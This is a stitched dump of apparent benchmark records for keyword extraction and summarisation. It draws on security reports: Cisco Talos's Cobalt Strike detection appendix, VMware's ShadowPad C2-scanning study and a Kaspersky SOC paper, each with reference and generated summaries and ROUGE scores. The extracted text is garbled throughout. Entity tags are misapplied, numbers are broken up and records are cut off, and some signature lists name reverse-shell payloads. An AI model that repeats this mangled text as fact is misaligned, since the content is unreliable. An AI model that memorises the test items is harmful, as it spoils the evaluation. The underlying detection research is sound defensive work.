Malware . CobaltStrike-8008971 - 0CONCLUSION This is an in - depth view into the Cobalt Strike attack framework , how [PERSON] Talos researchers analyzed each module and the struggles , breakdowns , victories , and detection that came along with it . The research performed resulted in [CARDINAL] more [CARDINAL] than [CARDINAL] 50 signatures between [ORG] Snort and [ORG] ClamAV combined , covering over [CARDINAL] 400 Cobalt Strike samples . It \u2019s important to note that the resulting detection based on this research project is intended to provide robust coverage for Cobalt Strike at its core , but is by no means exhaustive . Large - scale attack frameworks are always evolving , especially highly funded ones such as Cobalt Strike . Researchers must target what each security product does well and use that to their advantage . With that , you also have to know where its weaknesses lie . Having a [ORG] goodtalos-external@cisco.com | talosintelligence.compage [CARDINAL] 26 of 29understanding of the strengths and weaknesses in [GPE] Snort or [ORG] ClamAV is key to developing good generic detection . Does this mean we have covered Cobalt Strike in its entirety and it \u2019s forever dead in the eyes of [PERSON] Talos ? No . Does it mean we have provided what we believe to be a reasonably high level of detection to stop Cobalt Strike in its current form ? Most definitely.talos-external@cisco.com | talosintelligence.compage [CARDINAL] 27 of 29APPENDIX A : [ORG] COVERAGESTAGED / STAGELESS EXECUTABLES1:53656 MALWARE - OTHER Cobalt Strike x86 executable download attempt [CARDINAL] 1:53657 MALWARE - OTHER Cobalt Strike x86 executable download attempt 1:53658 MALWARE - OTHER [ORG] Cobalt Strike x64 executable download attempt 1:53659 MALWARE - OTHER [PERSON] Cobalt [PERSON] Strike x64 executable download attemptBEACON BINARY PAYLOADSSnort [CARDINAL] \u20221:30229 INDICATOR - SHELLCODE Metasploit windows/ shell stage transfer attempt * * ( UPDATED ) * * 1:30471 INDICATOR - SHELLCODE Metasploit payload windows_adduser * * ( UPDATED ) * * 1:30480 INDICATOR - SHELLCODE INDICATOR- SHELLCODE Metasploit payload windows_x64 _ meterpreter_reverse_https * * ( UPDATED ) * * [ORDINAL] 1:53757 MALWARE - OTHER CobaltStrike beacon.dll download attempt 1:53758 MALWARE - OTHER CobaltStrike beacon.dll download attempt\u2022\u2022\u2022\u2022ClamAV \u2022 \u2022`Win . Trojan . CobaltStrike-7899871 - 1 ` Win . Trojan . CobaltStrike-7899872 - 1SCRIPTED WEB DELIVERY POWERSHELLClamAV \u2022 Win . Trojan . MSShellcode-5 \u2022 Win . Trojan . CobaltStrike-7913051 - 0BEACON POWERSHELL PAYLOADSSnort \u2022Snort \u2022\u2022\u2022\u2022\u2022\u2022\u2022\u2022\u20221:45907 MALWARE - CNC Cobalt Strike [ORG] DNS beacon outbound TXT record * * ( UPDATED ) * * [CARDINAL] 1:45908 MALWARE - CNC [ORG] Cobalt [ORG] Strike [ORG] DNS beacon inbound TXT record * * ( UPDATED ) * * [DATE] 1:53972 MALWARE - OTHER [ORG] CobaltStrike beacon.dll [ORG] DNS download attempt [CARDINAL] 1:53973 MALWARE - OTHER CobaltStrike powershell web delivery attempt [CARDINAL] 1:53974 MALWARE - OTHER CobaltStrike powershell web delivery attempt 1:53975 INDICATOR - COMPROMISE CobaltStrike multiple large [ORG] DNS TXT query responsesClamAV \u2022`Win . Trojan . Meterpreter-7385375 - 0`\u2022\u2022Snort \u2022\u20221:54095 MALWARE - OTHER [PERSON] Win . Trojan . CobaltStrike powershell beacon download attempt 1:54096 MALWARE - OTHER [PERSON] Win . Trojan . CobaltStrike powershell beacon download attemptClamAV \u2022 Win . Trojan . CobaltStrike-7917400 - 0HTML APPLICATION ( [ORG] HTA ) [ORG] ATTACKSSnort \u20221:8068 BROWSER - PLUGINS Microsoft Windows Scripting Host Shell ActiveX function call access [ORDINAL] 1:54110 MALWARE - OTHER Html . Trojan . CobaltStrike HTML payload download attempt 1:54111 MALWARE - OTHER Html.Trojan.CobaltStriketalos-external@cisco.com | talosintelligence.compage [CARDINAL] 28 of 29ClamAV \u2022 Win . Trojan . CobaltStrike-8001474 - 0 \u2022 Win . Trojan . CobaltStrike-8001477 - 1COBALT STRIKE SMART APPLET ATTACKSnort \u20221:54183 INDICATOR - COMPROMISE Cobalt Strike default smart applet attack URIClamAV \u2022Prior coverage signed [PRODUCT] applet [PRODUCT] submissionsCOBALT [PRODUCT] STRIKE [PRODUCT] SYSTEM PROFILER ATTACKSnort \u20221:13913 BROWSER - PLUGINS AcroPDF.PDF ActiveX clsid access attempt * * MAX DETECT * * 1:23878 BROWSER - PLUGINS Oracle JRE Deployment Toolkit ActiveX clsid access attempt * * MAX DETECT * * 1:38038 POLICY - OTHER [ORG] PDF ActiveX CLSID access detected * * MAX DETECT * * [ORDINAL] 1:54180 MALWARE - OTHER [ORG] Cobalt Strike system profiling attempt [CARDINAL] 1:54181 MALWARE - OTHER [ORG] Cobalt Strike system profiling attempt 1:54182 MALWARE - OTHER Cobalt Strike system profiling attempt\u2022\u2022\u2022\u2022\u2022ClamAV \u2022Java . [PERSON] Malware . CobaltStrike-8008971 - 0\u2022\u2022\u2022\u2022\u2022\u2022HTML payload download attempt 1:54112 MALWARE - OTHER Html . Trojan . CobaltStrike HTML payload download attempt [CARDINAL] 1:54113 MALWARE - OTHER [PERSON] Html . Trojan . CobaltStrike HTML payload download attempt [DATE] 1:54114 MALWARE - OTHER [PERSON] Html . Trojan . CobaltStrike powershell payload download attempt 1:54115 MALWARE - OTHER Html . Trojan . CobaltStrike powershell payload download attempt 1:54116 MALWARE - OTHER [PERSON] Html . Trojan . [PERSON] CobaltStrike [PERSON] VBA payload download attempt 1:54117 MALWARE - OTHER Html . Trojan . [PERSON] CobaltStrike [PERSON] VBA payload download attemptClamAV \u2022 Html . Trojan . CobaltStrike-7932561 - 0 \u2022 Html . Trojan . CobaltStrike-7932562 - 0 \u2022 Html . Trojan . CobaltStrike-7932563 - 0 [ORG] \u2022 [ORG] Html . Trojan . CobaltStrike-7932564 - 0COBALT STRIKE SIGNED APPLET ATTACKSnort \u20221:54169 MALWARE - OTHER Cobalt Strike signed java applet execution attempt [CARDINAL] 1:54170 MALWARE - OTHER Cobalt Strike signed java applet execution attempt [CARDINAL] 1:54171 MALWARE - OTHER Cobalt Strike signed java applet download attempt 1:54172 MALWARE - OTHER [ORG] Cobalt Strike signed java applet download attempt [DATE] 1:54173 MALWARE - OTHER [ORG] Cobalt Strike signed java applet download attempt [CARDINAL] 1:54174 MALWARE - OTHER Cobalt Strike signed java applet download attempt 1:54175 INDICATOR - COMPROMISE Cobalt Strike default signed applet attack URI\u2022\u2022\u2022\u2022\u2022\u2022talos-external@cisco.com | talosintelligence.compage [CARDINAL] 29 of 29", "generated_text": "the art; detection; Cobalt Strike; obfuscation techniques; RAR; Shellcode; sophisticated Applets; the target module; HTTPS; HTTPS; HTTPS; HTTPS; data exfiltration; C2 communication; the system profiler; a payload; commands; Execute; the user; a listener; the C2; the payload; the component; a payload; a command; process; the C2 server; the system; a system profiler; a request; commands; commands; the malware; commands; a task; a Compromise; a command; the product; the effectiveness; Analysis; the framework; detection; users.", "ref_text": "<START-1>The PDF discusses the Cobalt Strike penetration testing toolkit and how Cisco Talos analyzed it to develop detections. Cobalt Strike is made up of different modules that fulfill specific functions like command and control, stealth, and reconnaissance. The paper provides an overview of Cobalt Strike including listeners for command and control, web management for hosting payloads and attacks, and reporting features. It then analyzes the different attack modules Cobalt Strike offers such as raw shellcode generator, executable generator, HTML application attacks, scripted web delivery, signed applet attacks, smart applet attacks, and system profiling. For each module, the PDF explains how the attack works technically, shows examples of the attack code, and discusses how Talos researchers analyzed the attacks to develop signatures for the Snort and ClamAV engines. The analysis examines elements like stagers, beacon configuration, C2 communication, vulnerability exploitation, and obfuscation techniques. Based on understanding how each module operates, Talos crafted precise Snort and ClamAV rules to detect Cobalt Strike while avoiding false positives. In total, Talos created over 50 new signatures covering raw shellcode, executables, web delivery, HTML application attacks, Java applets, and profiling. By thoroughly analyzing Cobalt Strike's components, Talos was able to provide robust detection for this popular penetration testing toolkit while it continues to evolve. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5056179775280898, "gpt3/lexical/rouge_rouge2": 0.2090395480225989, "gpt3/lexical/rouge_rougeL": 0.34269662921348315, "gpt3/lexical/rouge_rougeLsum": 0.34269662921348315, "gpt3_generated_text": ["The article discusses the art and science of detecting Cobalt Strike, a widely used and sophisticated cyber security toolkit. The author highlights the challenges in detecting Cobalt Strike due to its obfuscation techniques and customizable components. The article focuses on various modules and functionalities of Cobalt Strike, including listeners, web management, reporting, attack analysis, and C2 communication. The author also explores the target modules such as raw shellcode generator, staged/stageless executable generator, HTML application attack generator, scripted web delivery, signed Java applet attack, smart Java applet attack, and system profiler. The article emphasizes the importance of detecting Cobalt Strike and provides insights into the techniques used by malicious actors. The author also discusses the updated SNORT and ClamAV signatures by Cisco Talos to detect Cobalt Strike 4.0. Overall, the article provides a comprehensive analysis of Cobalt Strike and the strategies used for its detection."]}, {"split_name": "test", "sample_id": "test_108", "prompt_text": "Extract the keywords: blogs.vmware.com /security/2022/10 / threat - analysis - active - c2 - discovery - using - protocol - emulation - part3 - shadowpad.html Threat Analysis : Active C2 Discovery Using Protocol Emulation Part3 ( [ORG] ShadowPad ) [PERSON] Tom [PERSON] Gillis \u22ee \u22ee [CARDINAL] 10/27/2022ShadowPad is a modular malware platform privately shared with multiple [GPE] PRC - linked threat actors since [DATE] 2015 . According to [ORG] SentinelOne , [ORG] ShadowPad is highly likely the successor to PlugX. Due to its prevalence in the cyber espionage field , [ORG] the [ORG] VMware [ORG] Threat [ORG] Analysis [ORG] Unit ( [ORG] TAU ) was motivated to analyze the command and control ( C2 ) protocol to discover active [ORG] ShadowPad C2s on the Internet . [CARDINAL] C2 ProtocolShadowPad supports [CARDINAL] six C2 protocols : [ORG] TCP , [ORG] SSL , HTTP , [ORG] HTTPS , [ORG] UDP , and [ORG] DNS . In this research , [ORG] TAU focuses on [ORG] TCP / HTTP(S)/UDP protocols as others like [ORG] SSL and [ORG] DNS are not likely utilized by the recent [ORG] ShadowPad samples . The format and encoding algorithm is different between [ORG] TCP and [CARDINAL] HTTP(S)/UDP.Table [CARDINAL] 1 : Difference in packet formatKey size Header size Payload size in the initial 0x14Up to 0x3FHTTP(S)/UDP HTTP(S ): Up to [DATE] 0x1F , [ORG] UDP : 0x10The key for the encoding is included in the header . Every integer value in the header is in big endian . Randomly - sized data will be appended as the payload to the initial handshake packet in both cases . The immediate values used by the encoding algorithms are different per variant ( probably per [ORG] ShadowPad builder version ) . Analysis was performed on [CARDINAL] three [ORG] ShadowPad variants , which [ORG] TAU was able to collect in [DATE] August [DATE] 2021 , as displayed in [LAW] Table [LAW] 2 . The SHA256 hash values are included in the Indicators of Compromise section below . Table [CARDINAL] 2 : Analyzed [ORG] ShadowPad variantsVariant name Variant1(aka ScatterBee)C2 protocol [ORG] Config [ORG] sizeAttributionSourceTCP / UDP0x896APT41Positive [GPE] Technologies1/14Variant2 Variant3HTTP(S ) HTTP(S)0x85C Positive [CARDINAL] TechnologiesTCP [ORG] ProtocolAnalysis was performed to fully detail the C2 protocol . The [ORG] TCP protocol header format is displayed as follows.struct [CARDINAL] struc_common_header{__int32 session_key;__int32 plugin_and_cmd_id ; // plugin_id ( 0x68 ) < < 16 + cmd_id ( 0x51)__int32 module_code ; // [CARDINAL] 0__int32 payload_size_compressed;__int32 payload_size_original;};The header format has been the same since [ORDINAL] first analyzed in [DATE] 2015 . The session_key is randomly generated and then used for encoding both the header and payload . The plugin_id and cmd_id values included in the plugin_and_cmd_id field have been updated by variants , some of which are covered in this paper . The values in the initial packet created by [PERSON] Variant1 should be 0x68 ( Online plugin ) and [CARDINAL] 0x51 ( check - in ) . The module_code of the initial packet generated by the sender is always [CARDINAL] 0 ( zero).If any payload data exists , it will be compressed with the QuickLZ algorithm . QuickLZ is an older , publicly available compression routine that is not commonly seen . The client generates randomly - sized null bytes ( up to 0x3F bytes ) for the initial packet payload . The [GPE] Variant1 \u2019s encoding algorithm for the [ORG] TCP packet in Python is displayed in Figure [CARDINAL] 1 . Based on the protocol analysis results of [GPE] Variant2 and [PERSON] Variant3 , variants of this malware are expected to contain unique immediate values instead of [CARDINAL] 0x22F4B1BA for the [ORG] TCP packet encoding.2/14Figure [CARDINAL] 1 : [ORG] TCP packet encoding by Variant1After the initial handshake , [GPE] Variant1 executes the commands of the plugins specified by the C2 server . For more details , review the Dr. WEB white paper explaining the individual command IDs and payload formats . The variant analyzed in the paper is older than Variant1 but the formats should be similar . HTTP(S ) and [ORG] UDP [ORG] ProtocolsThe header format for the HTTP(S ) and [ORG] UDP protocols is listed below . In HTTP(S ) , the data is sent through the [ORG] POST method.struct [CARDINAL] struc_proto_header{__int16 session_key;__int16 type ; // [CARDINAL] 0 in HTTP , req=0x1001 / res=(0x2002|0x5005 ) in UDP__int16 session_src_id ; // random [CARDINAL] 2 bytes , generated by both client / server3/14__int16 session_dst_id ; // req=0 , res = client \u2019s session_src_id};The session_key has the same role as the [ORG] TCP session_key though the key size is different . The [ORDINAL] second field type is always [CARDINAL] 0 ( [CARDINAL] zero ) in the HTTP initial packet while the [ORG] UDP client and server send 0x1001/0x2002/0x5005 . The session_src_id field is randomly generated by both client / server . The value sent by the client will be set in the session_dst_id field on the server side . The initial packet payload data are randomly generated based on [PERSON] QueryPerformanceCounter and other APIs . The HTTP payload size is also random with a length of [CARDINAL] up [CARDINAL] to [CARDINAL] 31 ( 0x1F ) bytes while the [ORG] UDP one is fixed at [CARDINAL] 16 ( 0x10 ) bytes . Each of the [CARDINAL] three Variant encoding algorithms in Python is shown below . The immediate values in the code are different , but the algorithm itself is identical . Figure [CARDINAL] 2 : [ORG] UDP packet encoding by Variant14/14Figure [CARDINAL] 3 : HTTP(S ) packet encoding by [LAW] Variant25/14Figure [LAW] 4 : HTTP(S ) packet encoding by Variant3After the initial handshake , the payload will contain the same data structure as the [ORG] TCP packet ( [NORP] struc_common_header and its QuickLZ - compressed payload ) explained in the previous section while the type field value in the struc_proto_header will be incremented . [PERSON] Scanner ImplementationTAU decided on the following target protocols / ports based on the configurations extracted from the recent [ORG] ShadowPad samples . As explained earlier , the scanner per variant had to be implemented due to the difference in immediate values used in the encoding . Table [CARDINAL] 3 : Target protocols / portsScanning start period June 2022Target protocol / port / variant HTTP/443 ( [ORG] Variant2 [ORG] & [ORG] Variant3 ) [ORG] TCP/443 [ORG] & [ORG] UDP/53 ( [GPE] Variant1 ) UDP/443 ( [GPE] Variant1 ) , [ORG] HTTP/80 ( Variant3)6/14The following flow chart shows how the [ORG] ShadowPad C2 servers are detected by the scanners . Figure [CARDINAL] 5 : [ORG] ShadowPad C2 detection flowSimilar to our Winnti [PRODUCT] 4.0 [PRODUCT] C2 scanning research , [ORDINAL] first the list of hosts open at targeted ports are created by ZMap . Then the scanner sends the [ORG] ShadowPad - formatted packets to all [ORG] IP addresses on the list . Next , the scanner checks that the response packet size is at least more than the header size and the session_key is different from the sending one to exclude honeypots . If the size and key look to be valid , the scanner decodes the response packet . In TCP protocol , the scanner validates the payload size fields ( payload_size_compressed and payload_size_original ) . In HTTP(S ) and [ORG] UDP protocols , the code verifies if the type field value is correct and the response \u2019s session_dst_id is matched with the session_src_id created by the scanner . The following output log shows that [CARDINAL] eight [GPE] Variant1 TCP servers were discovered by scanning the list of TCP/443 open hosts generated by [GPE] ZMap . The command_id 0x53 from the [ORG] C2s is a request to send system information of the infected host.2022/06 / xx xx:00:02,log file opened : scan_results / sp_scan_auto_202206xx_xxxxxx.csv7/142022/06 / xx xx:00:05,malware options : family = [ORG] ShadowPad ; targeted protocol = tcp ( version = [CARDINAL] Variant1)2022/06 / xx xx:00:09,ShadowPad specific options : version = [GPE] Variant1 ; key size = [CARDINAL] 4 ; key endian = big ; header size = [CARDINAL] 0x14 ; Online plugin ID = [CARDINAL] 0x68 ; [ORG] CMD ID = [CARDINAL] 0x51 ; module code = 0x02022/06 / xx xx:00:16,51576779 open hosts read from corpus/2022 - xx- ( plugin_id=0x68 , command_id=0x53 , payload = None)2022/06 / xx xx:48:35,51576779 scanned in [DATE] 1 [DATE] day , [CARDINAL] 17:48:32.4975502022/06 / xx xx:48:35,8 suspicious / active servers found ( DB new=4 update=4)In order to detect the [PERSON] Variant2 / Variant3 C2 servers [ORG] TAU just uses the HTTP protocol scanner , not the [ORG] HTTPS one , because the ShadowPad C2s can accept multiple protocol requests at a single port . [ORG] TAU noticed the unique feature by extracting the [CARDINAL] C2 server configurations from the sample ( SHA256 : another active [ORG] ShadowPad C2 can accept both protocols at the same port.$ ./c2fs.py -d -l corpus / query.txt -p [CARDINAL] 443 -f sp http [PERSON] Variant2 [ * ] malware options : family = [ORG] ShadowPad ; targeted protocol = http ( version = [PERSON] Variant2 ) [ * ] [ORG] ShadowPad specific options : version = [PERSON] Variant2 ; key size = [CARDINAL] 2 ; key endian = big ; header impossible to test because [ORG] TAU has not obtained any samples of the variants with the multiple C2 protocol plugins yet . ResultBetween September 2021 to September 2022 , [ORG] TAU identified [CARDINAL] 83 [ORG] ShadowPad C2 servers ( [CARDINAL] 75 unique IPs ) on the Internet . The percentage of each variant is shown in Figure [CARDINAL] 6 . During the tracking period , we witnessed that [GPE] Variant1 had become more active . Figure [CARDINAL] 6 : [ORG] ShadowPad population by variantThe change in the number of active [ORG] ShadowPad [ORG] C2s is shown in Figure [CARDINAL] 7.9/14Figure [CARDINAL] 7 : Change in the number of active [ORG] ShadowPad C2sCompared with [DATE] 2021 , the active [ORG] C2s in [DATE] 2022 has been on a declining trend , though the sharp drop in [DATE] February [DATE] 2022 was due to the system issue . The scanner may have missed a new variant lately as [ORG] ShadowPad changes the immediate values used in the packet encoding per variant . [ORG] TAU will continuously improve the scanner as [ORG] TAU obtains new variant samples . [PERSON] Malware [PERSON] Samples Sharing C2 [PERSON] IPsTAU identified [CARDINAL] three samples communicating with the [ORG] ShadowPad C2 [ORG] IP addresses on [ORG] VirusTotal . The sample information is listed in [ORG] Table 4.Table [CARDINAL] 4 : Samples communicating with the [ORG] ShadowPad C2 IPsSample [PERSON] Malware family [ORG] C2 [ORG] IP [ORG] addressC2 [QUANTITY] 2022/02/27 [QUANTITY] 2021/10/17 [QUANTITY] 2022/10/04 [QUANTITY] 2022/03/20 2022/03/06 2022/09/27Spyder and [PRODUCT] ReverseWindow are [ORG] APT malware utilized by [GPE] PRC - linked cyber espionage threat actors ( respectively [GPE] APT41 and [ORG] LuoYu ) . All C2s were discovered by the [ORG] TCP/443 [ORG] Variant1 scanner , but the samples communicated with a different protocol or port . Except the Spyder sample case , the [ORG] C2s had accepted multiple protocols / ports at that time . The scanning system caught the [ORG] C2s prior to the sample submissions in all cases . Spyder Code Similarity with Winnti 4.0Incidentally , it should be noted that the above - referenced Spyder sample contains the code handling the same C2 command data structure as Winnti 4.0 Worker which [ORG] TAU reported [DATE] three [DATE] years [DATE] ago in [CARDINAL] 2019.Figure 8 : Code handling C2 commands11/14The command IDs used by the malware families are shown in [LAW] Table [LAW] 5 . The commands are decided based on a combination of [CARDINAL] two numbers . Dr. [ORG] WEB defined the numbers as tag and i d in the Spyder report while [ORG] TAU defined them as cmd_ID and dispatch_ID in the Winnti [CARDINAL] 4.0 Worker analysis . Both have almost the same [CARDINAL] C2 command functions . Table [CARDINAL] 5 : Spyder and [ORG] Winnti 4.0 command [PERSON] IDsSpyder [PERSON] Verify the client Send victim information Send plugins information [ORG] Save plugin parameters [ORG] Save plugin data [PRODUCT] Load and run plugin entrypoint and export function # 1 Run plugin export function # [MONEY] 4 [MONEY] 6 and unload the plugin [PERSON] Run plugin export function # 2 6 [PERSON] Run plugin export function # 3 [CARDINAL] 6Send current connection information7Run function pointer of the [ORDINAL] 2nd parameter obtained by running export function # 111id [CARDINAL] 82 \u2013 Winnti [CARDINAL] 4.0 Worker [CARDINAL] 9 or [CARDINAL] 13 [CARDINAL] 11\u2013\u2013On the other hand , the total code similarity between them is [PERCENT] just 37 % when analyzed with the [ORG] BinDiff utility . Other data structures like configuration block and C2 protocol header are much different . Based on the comparison displayed in [LAW] Table [LAW] 5 , [ORG] TAU hypothesizes that [ORG] Spyder is a lightweight version of Winnti [CARDINAL] 4.0 Worker . Table [CARDINAL] 6 : [ORG] Comparison [ORG] of [ORG] Spyder and [ORG] Winnti [CARDINAL] 4.0 [ORG] WorkerSpyderWinnti 4.0Payload XORAES in [ORG] CTR mode ( key given as a cmdline argument)C2 [ORG] Protocol TLSTCP / TLS / HTTP(S)/UDPServer - mode advanced and sophisticated attack had bypassed many methods of detection but was ultimately alerted upon simply because of the pre - identified C2 IP.Figure [CARDINAL] 9 : [PERSON] Alert based on the [ORG] ShadowPad C2 ConclusionBy emulating the [ORG] ShadowPad C2 protocols then scanning the [CARDINAL] C2 servers on the Internet , [ORG] TAU has discovered over [CARDINAL] 80 C2 servers . The IOCs has been published on the [ORG] GitHub page with discovered date ranges which are more helpful than just [ORG] IP address information since the [ORG] C2s are typically found on hosted servers . [CARDINAL] Approximately [CARDINAL] 10 C2s have always been active . [ORG] TAU sees little possibility of false positives because the C2 protocol formats and encoding algorithms are fairly unique.13/14Scanning [ORG] APT malware C2s on the Internet is sometimes like finding a needle in a haystack . However , once the C2 scanning works , it can become a game changer as one of the most proactive threat detection approaches . AcknowledgmentTAU appreciates [PERSON] Leon [PERSON] Chang \u2019s expertise and advice regarding [ORG] ShadowPad . [PERSON] Chang shared his knowledge to gain a more complete , bigger picture of the variants . Indicators of Compromise ( IOC)TypeContextIndicator", "generated_text": "PDF; VMware Threat Analysis Unit; TAU; ShadowPad; use; packet size; the header; payload size; the payload; the header; the payload; 2017; 0x17; 0x5F; the payload; initial handshake packet; The payload data; the component; ScatterBee; the CPU; compression; the module_code; 0x10; 0x3F; the payload; the initial payload; 0x4; time; a random payload; the payload; the first stage; 0x2F; 0x10; a payload; the payload; the initial payload; 0x2F; the payload; the payload; the encoding algorithm; the C2 protocol.", "ref_text": "<START-1>The document describes research by VMware's Threat Analysis Unit on the command and control (C2) protocol used by the ShadowPad malware. ShadowPad is a modular malware platform used by China-linked threat actors since 2015. ShadowPad supports six C2 protocols: TCP, SSL, HTTP, HTTPS, UDP, and DNS. The analysis focuses on the TCP, HTTP(S), and UDP C2 protocols. It provides details on the packet header formats, encoding algorithms, and initial handshake flows for these protocols. Multiple ShadowPad variants were analyzed that use different encoding values. Based on the protocol analysis, VMware implemented scanners to actively search for ShadowPad C2 servers on the internet. Between 2021-2022, they identified 83 servers linked to 3 variants. The number of active C2s declined in 2022. Samples communicating with discovered C2 IPs included malware like Spyder and ReverseWindow used by China-linked groups. One Spyder sample was found to have code similarities to Winnti malware, suggesting it could be a lightweight version. In summary, the report documents VMware's in-depth analysis of ShadowPad's C2 protocols, implementation of detection scanners, discoveries of 83 C2 servers over time, and connections to advanced malware samples. This showcases the value of C2 protocol analysis and active scanning for proactive discovery of threats. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.5799457994579946, "gpt3/lexical/rouge_rouge2": 0.23978201634877386, "gpt3/lexical/rouge_rougeL": 0.3252032520325203, "gpt3/lexical/rouge_rougeLsum": 0.3252032520325203, "gpt3_generated_text": ["The article discusses the threat analysis of the ShadowPad malware platform, which has been privately shared with PRC-linked threat actors since 2015. The VMware Threat Analysis Unit (TAU) conducted an analysis of the command and control (C2) protocol used by ShadowPad to discover active C2s on the Internet. ShadowPad supports six C2 protocols, including TCP, SSL, HTTP, HTTPS, UDP, and DNS, but the focus of the research is on TCP/HTTP(S)/UDP protocols. The article provides details about the packet format, key size, header size, and payload size for different protocols. The article also analyzes the C2 protocol for different variants of ShadowPad, including ScatterBee, and describes the encoding algorithm and payload formats used by these variants. The article concludes by highlighting the use of the QuickLZ compression algorithm and the execution of commands specified by the C2 server after the initial handshake. Overall, the article provides a comprehensive analysis of the ShadowPad malware platform and its C2 protocol."]}, {"split_name": "test", "sample_id": "test_109", "prompt_text": "Extract the keywords: Guided Defense . [PERSON] Kaspersky [PERSON] CenterBarriers to an effective [ORG] Security [ORG] Operations [ORG] CenterAs businesses learn to better protect themselves , criminals are simultaneously devising increasingly sophisticated techniques to penetrate their security barriers . Attracted by the unprecedented financial rewards that cyberattacks can deliver , growing numbers of threat actors are actively seeking and targeting undiscovered security flaws . In this environment , many organizations are establishing [ORG] Security [ORG] Operations [ORG] Centers ( SOCs ) to combat security issues as they arise , providing a swift response and a decisive resolution . Key findings according [PERSON] the [PERSON] Kaspersky [PERSON] Corporate [PERSON] IT [PERSON] Security [PERSON] Risks [PERSON] Survey in 2018:\u2022 The cost of data breaches jumped by overa [ORDINAL] fifth . The average financial impact of a data breach now stands at $ 1.23 [MONEY] million for enterprises , a 24 % increase on [CARDINAL] 2017.\u2022 Making infrastructure improvements after a breach now sets enterprises back $ [MONEY] 193k on average , a more than 46 % increase on the $ [MONEY] 132k it cost them in [CARDINAL] 2017.\u2022 The good news is that average securitybudgets have increased across businesses of all sizes . Enterprises now spend an average of $ [MONEY] 8.9 m on cybersecurity.\u2022 Compared with [DATE] previous [DATE] years , the incidenceof global threats experienced continues to grow : The [ORG] SOC is a centralized function for continuous threat monitoring and analysis , and for the mitigation and prevention of cybersecurity incidentsThe ever - growing volume , complexity , and severity of [DATE] today \u2019s cyberthreats means that documenting processes , implementing basic technologies and building a team of monitoring and response specialists is just the beginning . Without the ability to continuously adapt and advance , in response to ongoing changes in the threat landscape , the effectiveness of the [ORG] SOC may be compromised . According to [ORG] Gartner \u2019s [ORG] Adaptive [ORG] Security [ORG] Architecture model , if an organization is to successfully fight cybercrime in the current threat environment , its [ORG] SOC [ORG] Team must be able to predict , prevent , detect , and respond effectively to threats.20162017201852%48%38%Malware infection36%25%DDoS attacks36%27%21%Targeted attacksFigure [CARDINAL] 1 : Global threats experiencedPredictPreventProactive [ORG] Gartner , [ORG] Designing [ORG] an [ORG] Adaptive [ORG] Security [ORG] Architecture [ORG] for [ORG] Protection [ORG] From [ORG] Advanced [ORG] Attacks , February 2014\u201cSecurity Operations Centers must be architected for intelligence , embracing an adaptive security architecture to become context - aware and intelligence - driven . Security leaders should understand how intelligence - driven SOCs use tools , processes and strategies to protect against modern threats \u201d [PERSON] Gartner , The Five Characteristics of an [ORG] Intelligence - Driven [ORG] Security [ORG] Operations [ORG] Center , [DATE] November [DATE] 20151The \u2018 SANS [DATE] 2018 Security Operations Center \u2019 survey of organizations who have created their own SOCs indicates that businesses encounter a number of barriers on the way to achieving an effective , well - run SOC.SOC [PRODUCT] ShortcomingsLack of skilled staff62%Lack of automation and orchestration53%Too many tools that are not integrated48%Lack of enterprise - wide [GPE] visibility42%Too many alerts that we ca n\u2019t investigate34%Lack of context about what we \u2019re seeing19%Source : [ORG] SANS2018 [ORG] Security [ORG] Operations [ORG] Center [ORG] SurveyIn the face of overall IT security staff shortages , SOCs face a particular problem in terms of shortfalls in suitable skills and experience . The SOC team requires highly qualified niche specialists , with knowledge and experience in the fields of malware analysis , digital forensics , incident response , etc . These professionals should be able to correctly interpret data from the SIEM ( Security Information and Event Management ) system , identify and extract important information from the general data stream , fine- tune correlation rules and enrich the received information with additional context . Insufficient analyst expertise in dealing with complex threats , together with a lack of knowledge in how to use contextual data to correctly scope and investigate incidents , makes determining the most appropriate response to a specific threat much more difficult , and this can be very damaging to the business . Another issue which can reduce the effectiveness of the [ORG] SOC is lack of automation . [DATE] Today , many analysts spend much their time on routine operations which are necessary and important , but which can be automated . Automating these manual tasks saves expensive analyst labor hours , and the resultant workload reduction frees more time to focus on analyzing and responding to really complex incidents . Running too many point tools , which do n\u2019t integrate with [CARDINAL] one other , is a concern for 48 % of survey respondents . This forces analysts to switch between different tools and consoles , which wastes time , and provides opportunities for error . When introducing additional protection and automation tools , it \u2019s important to take into account how these will integrate with existing solutions , and with one another . Information security tools , together with critical business applications connected to [ORG] SIEM systems , generate a stream of alerts that should be reviewed [DATE] daily . But this super- abundance of information means that many alerts remain unprocessed - [PERCENT] around 50 % of all alerts are never investigated . Meanwhile , levels of false positives experienced can be as high as 60 - 80 % . All this means that trying to identify genuine potential threats can feel to the analyst like searching for needles in a haystack . Inevitably , serious incidents can get missed . Overwhelmed by data , SOCs often understandably try to restrict their scope by monitoring a limited range of systems , but the problem with this approach is that they then do n\u2019t have a complete view of their entire infrastructure . This leads to another challenge \u2013 a lack of enterprise - wide visibility . For example , endpoints are rarely used as log sources in [ORG] SIEM systems , partly because it \u2019s expensive to do so , and partly due to the high number of false positives this generates . But endpoints are a key target for attackers \u2013 workstations and servers are the most common attack entry point into corporate IT infrastructures \u2013 and their data is key to investigating incidents ( processes , programs , modules , files , autoruns , network connections , etc . ) . Add to this the new [PRODUCT] TLS [PRODUCT] 1.3 protocol , which further increases the value of telemetry analysis found on endpoints , and it becomes clear why accessing this data is important.2Figure [CARDINAL] 3 : SOC shortcomingsLack of skilled staffLack of AutomationLack of integrationToo many alertsLack of enterprise - wide visibilityLack of contextual dataA lack of understanding of the motivation , tactics , techniques and procedures employed by attackers can prevent [ORG] SOC specialists from prioritizing incidents for investigation appropriately , leading to the specialist trying to do everything at once , or becoming paralyzed with indecision . Without appropriate and informed incident prioritization , there may be too many alerts to handle , increasing the stress on the overloaded SOC team and resulting in inefficiencies and increased response times . As a result , significant alerts suffer , while the percentage of inaccurate investigative results increases . [ORG] Comparing information obtained by the SOC with threat intelligence data , provides the contextual information needed for appropriate incident prioritization and effective investigation.3Key [ORG] ElementsThe following key elements , together with clearly defined processes and relevant technologies , must be in place to sustain this industry - recognized approach:\u2022 [GPE] Knowledge management . People ( SOC team members ) must be well - trained in digital forensics , malware analysis and incident response in order to prevent and successfully respond to increasingly sophisticated attacks.\u2022 Advanced detection and response technologies oriented towards complexthreats and targeted attacks enabling deeper analysis and faster incident response.\u2022 Threat intelligence , collected from relevant , trusted and reliable sources is essentialInternal threat data [ORG] Intelligence from open sources ( OSINT ) Industry - 